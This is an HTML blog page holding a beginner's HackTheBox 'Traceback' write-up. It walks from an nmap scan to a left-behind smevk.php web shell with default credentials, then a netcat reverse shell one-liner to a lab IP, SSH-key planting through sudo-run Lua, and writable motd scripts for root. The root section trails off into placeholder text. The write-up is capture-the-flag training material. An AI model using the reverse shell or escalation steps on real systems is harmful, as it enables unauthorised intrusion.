@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so...">
+  <meta name="keywords" content="blog and jekyll">
+  <meta name="author" content="HTB Traceback writeup | Sp3kt0rZ">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#f5f5f5">
+
+  <!-- Twitter Tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Traceback writeup | Sp3kt0rZ">
+  <meta name="twitter:description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so...">
+  
+    <meta property="twitter:image" content="http://localhost:4000/img/leonids-logo.png">
+  
+
+  <!-- Open Graph Tags -->
+  <meta property="og:type" content="blog">
+  <meta property="og:url" content="http://localhost:4000/articles/2020-08/lets">
+  <meta property="og:title" content="HTB Traceback writeup | Sp3kt0rZ">
+  <meta property="og:description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so...">
+  
+    <meta property="og:image" content="http://localhost:4000/img/leonids-logo.png">
+  
+  <title>HTB Traceback writeup | Sp3kt0rZ</title>
+
+  <!-- CSS files -->
+  <link rel="stylesheet" href="http://localhost:4000/css/font-awesome.min.css">
+  <link rel="stylesheet" href="http://localhost:4000/css/main.css">
+
+  <link rel="canonical" href="http://localhost:4000/articles/2020-08/lets">
+  <link rel="alternate" type="application/rss+xml" title="Sp3kt0rZ" href="http://localhost:4000/feed.xml" />
+
+  <!-- Icons -->
+  <!-- 16x16 -->
+  <link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+  <!-- 32x32 -->
+  <link rel="shortcut icon" href="http://localhost:4000/favicon.png">
+</head>
+
+
+<body>
+  <div class="row">
+    <div class="col s12 m3">
+      <div class="table cover">
+        
+
+<div class="cover-card table-cell table-middle">
+  
+  <a href="http://localhost:4000/">
+    <img src="http://localhost:4000/img/myAvatar.png" alt="" class="avatar">
+  </a>
+  
+  <a href="http://localhost:4000/" class="author_name">Sp3k0rZ</a>
+  <span class="author_job"></span>
+  <span class="author_bio mbm">Coming soon</span>
+  <nav class="nav">
+    <ul class="nav-list">
+      <li class="nav-item">
+        <a href="http://localhost:4000/">home</a>
+      </li>
+       
+      <li class="nav-item">
+        <a href="http://localhost:4000/archive/">Archive</a>
+      </li>
+          
+      <li class="nav-item">
+        <a href="http://localhost:4000/categories/">Categories</a>
+      </li>
+            
+      <li class="nav-item">
+        <a href="http://localhost:4000/resume/">Resume</a>
+      </li>
+        
+      <li class="nav-item">
+        <a href="http://localhost:4000/tags/">Tags</a>
+      </li>
+         
+    </ul>
+  </nav>
+  <script type="text/javascript">
+  // based on http://stackoverflow.com/a/10300743/280842
+  function gen_mail_to_link(hs, subject) {
+    var lhs,rhs;
+    var p = hs.split('@');
+    lhs = p[0];
+    rhs = p[1];
+    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
+    document.write(":" + lhs + "@");
+    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
+  }
+</script>
+<div class="social-links">
+  <ul>
+    
+      <li>
+      <script>gen_mail_to_link('sphiwokuhleshandu24@gmail.com', 'Hello from website');</script>
+      </li>
+    
+    <li><a href="http://twitter.com/Sp3kt0r" class="social-link-item" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></li>
+    
+    
+    <li><a href="http://linkedin.com/in/Sphiwokuhle Shandu" class="social-link-item" target="_blank"><i class="fa fa-fw fa-linkedin"></i></a></li>
+    
+    
+    
+    
+    <li><a href="http://github.com/SphiwokuhleS" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
+    
+    <li><a href="http://stackoverflow.com/users/sphelele-shandu" class="social-link-item" target="_blank"><i class="fa fa-fw fa-stack-overflow"></i></a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </ul>
+</div>
+
+</div>
+
+      </div>
+    </div>
+    <div class="col s12 m9">
+      <div class="post-listing">
+        <a class="btn" href= "http://localhost:4000/" >
+  Home
+</a>
+
+
+
+<div id="post">
+  <header class="post-header">
+    <h1 title="HTB Traceback writeup">HTB Traceback writeup</h1>
+    <span class="post-meta">
+      <span class="post-date">
+        15 AUG 2020
+      </span>
+      •
+      <span class="read-time" title="Estimated read time">
+  
+  
+    5 mins read
+  
+</span>
+
+    </span>
+
+  </header>
+
+  <article class="post-content">
+    <p>Hey guys, this is my writeup for the <code class="language-plaintext highlighter-rouge">HackTheBox</code> machine <code class="language-plaintext highlighter-rouge">Traceback</code>. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so  the machine starts of with a <code class="language-plaintext highlighter-rouge">web server</code> that has been <code class="language-plaintext highlighter-rouge">compromised</code> and defaced, the hacker leaves a <code class="language-plaintext highlighter-rouge">backdoor</code> behind “for all the net” :), so we do some guess work and find the shell left behind and that’s the <code class="language-plaintext highlighter-rouge">foothold</code>. after accessing the <code class="language-plaintext highlighter-rouge">reverse shell</code> we do some recon and find that we can run <code class="language-plaintext highlighter-rouge">luvit</code> with <code class="language-plaintext highlighter-rouge">sudo privileges</code>, i then write an <code class="language-plaintext highlighter-rouge">ssh key</code> to the <code class="language-plaintext highlighter-rouge">sysadmins</code> ssh folder and get a shell as the <code class="language-plaintext highlighter-rouge">sysadmin</code>, for <code class="language-plaintext highlighter-rouge">root</code> we have a cron running with administrative privileges that runs everytime on a ssh login, we have the ability write the files that are executed when the cron runss.</p>
+
+<p><img src="/img/tr_con.png" alt="Traceback" />
+<!--more--></p>
+
+<p>So first things first, i run an nmap scan</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  <span class="c"># Nmap 7.80 scan initiated Sun Aug 16 14:15:10 2020 as: nmap -sC -sV -T4 -oA nmap/traceback -Pn 10.10.10.181</span>
+  Nmap scan report <span class="k">for </span>10.10.10.181
+  Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+  Not shown: 998 closed ports
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+  | ssh-hostkey: 
+  |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
+  |   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
+  |_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
+  80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+  |_http-title: Help us
+  Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</code></pre></figure>
+
+<p>Usually i runa full port scan after this one, but there were no other open ports. So we have ssh and an apache web server, looking at the web server, we have an interesting index page….</p>
+
+<p><img src="/img/tr_web_page_index.png" alt="web page" /></p>
+
+<p>So now we have to find this backdoor now, so next i look at the page source, and there’s an interesting comment.</p>
+
+<p><img src="/img/tr_page_source.png" alt="page source" /></p>
+
+<p>So i copied the comment and googled it, it brought me to a <a href="https://github.com/TheBinitGhimire/Web-Shells">github repository</a> with a list of web shells, i could’ve done a better job at guessing which web shell was running on the server but i instead decided to start at the bottom of the list entering each file name, luckily the one i was looking for was second last.</p>
+
+<p><img src="/img/tr_shell.png" alt="shell" /></p>
+
+<p>So we got the hit from smevk.php, so the default credentials are admin:admin from looking at the source code of the reverse shell.</p>
+
+<p><img src="/img/tr_smevk.png" alt="system" /></p>
+
+<p>So this php reverse shell script seems to have a lot of funtionality, but i prefer looking around using a shell, we’re able to run system commands on one of the form fields so i set a netcat listener and give myself a reverse shell on the machine.</p>
+
+<p>The reverse shell command :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.114 9001&gt;/tmp/f</code></pre></figure>
+
+<p>The listener :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">rlwrap nc <span class="nt">-lvnp</span> 9001</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">rlwrap</code> allows to use the arrow keys on the netcat shell.</p>
+
+<p>We get a shell :) and use python to get the tty.</p>
+
+<p><img src="/img/tr_shell_webadmin-1.png" alt="shell" /></p>
+
+<p>After this shell i spent a lot of time looking around around, which is why i think doing writeups is weird because we don’t show the rabbit hoels we went down XD. but i get it the wriiteup would be a 50 mintue read if we did :)</p>
+
+<p>So since we’re running as <code class="language-plaintext highlighter-rouge">webadmin</code> i check he’s home folder, we find a note.</p>
+
+<p><img src="/img/tr_note.png" alt="note" /></p>
+
+<p>So usually on linux i run <code class="language-plaintext highlighter-rouge">LinEnum</code> and <code class="language-plaintext highlighter-rouge">LinpPeas</code>, so on the linpeas we have find interesting stuff….</p>
+
+<p>So i copy the binaries to my working directory and start a <code class="language-plaintext highlighter-rouge">python</code> webserver.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python3 <span class="nt">-m</span> http.server 8080</code></pre></figure>
+
+<p>On the box i use whatever i can to download files, but i like using <code class="language-plaintext highlighter-rouge">wget</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wget http://10.10.14.114:8080/[file_name]</code></pre></figure>
+
+<p><img src="/img/tr_sudo_perms.png" alt="sudo" /></p>
+
+<p>I could’ve also got this with just <code class="language-plaintext highlighter-rouge">sudo -l</code>, but sometimes when you get a shell you forget the simplest things.</p>
+
+<p>So we can execute the <code class="language-plaintext highlighter-rouge">Luvit</code> program with sysadmin privileges, Luvit allows us to run <code class="language-plaintext highlighter-rouge">Lua</code> code, my first idea was to execute system commands through Lua, after a gazillion tries i gave up because it just wouldn’t work. So then i attempted to write my piublic ssh key to <code class="language-plaintext highlighter-rouge">authorized_keys</code> after a few minutes of figuring out how to do that in <code class="language-plaintext highlighter-rouge">Lua</code>.</p>
+
+<p>Creating an ssh key is easy, just run…</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh-keygen <span class="nt">-f</span> traceback</code></pre></figure>
+
+<p>This is the code to append my ssh key to the authorized_keys file</p>
+
+<p><img src="/img/tr_code.png" alt="code" /></p>
+
+<p>Then executed the Lua script with sysadmin privileges.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit spek.lua</code></pre></figure>
+
+<p>Then i try login to ssh with the key, but before i do that i have to change the permissions on the key</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">chmod </span>600 traceback</code></pre></figure>
+
+<p>And i was in as <code class="language-plaintext highlighter-rouge">sysadmin</code></p>
+
+<p><img src="/img/tr_ssh_sysadmin.png" alt="ssh" /></p>
+
+<p>On the <code class="language-plaintext highlighter-rouge">LinPeas</code> output i also saw something else that was interesting, we could write files in the <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code>
+when i login with ssh run parts executes all the scripts in the directory, these scripts are also backep up every 30 seconds  , 
+i found this out after some time analyzing what was happening. i think this was also a wat for the hacker to have a way to have root privileges in an easy and hidden way.</p>
+
+<p><img src="/img/tr_ls_w.png" alt="ls_w" /></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">get <span class="nb">command
+</span>exe <span class="nb">command</span></code></pre></figure>
+
+
+  </article>
+</div>
+
+<div class="share-buttons">
+  <h6>Share on: </h6>
+  <ul>
+    <li>
+      <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/articles/2020-08/lets" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+    </li>
+    <li>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/articles/2020-08/lets" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+    </li>
+    <li>
+      <a href="https://plus.google.com/share?url=http://localhost:4000/articles/2020-08/lets" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+    </li>
+    <li>
+      <a href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/articles/2020-08/lets" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+    </li>
+    <li>
+      <a href="https://www.reddit.com/submit?url=http://localhost:4000/articles/2020-08/lets" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+    </li>
+  </ul>
+</div><!-- end share-buttons -->
+
+
+
+        <footer>
+  &copy; 2020 Sp3k0rZ. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
+</footer>
+
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript" src="http://localhost:4000/js/jquery-3.2.1.min.js"></script>
+<script type="text/javascript" src="http://localhost:4000/js/main.js"></script>
+
+
+</body>
+</html>
